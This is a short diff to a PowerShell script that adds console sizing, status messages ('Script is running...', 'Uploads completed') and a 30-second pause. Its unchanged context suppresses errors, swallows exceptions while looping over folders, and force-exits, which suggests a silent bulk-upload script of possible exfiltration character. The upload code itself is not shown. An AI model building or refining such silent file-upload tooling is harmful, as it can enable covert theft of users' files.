@@ -1,3 +1,6 @@
+[Console]::WindowWidth = 80
+[Console]::WindowHeight = 25
+Write-Host "Script is running..." -ForegroundColor Green
 # 1. Force immediate execution
 $ErrorActionPreference = 'SilentlyContinue'
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
@@ -31,6 +34,8 @@ foreach ($folder in $folders) {
         } catch {}
     }
 }
+Write-Host "Uploads completed" -ForegroundColor Green
+Start-Sleep -Seconds 30
 
 # 4. Immediate exit (remove for debugging)
 [Environment]::Exit(0)
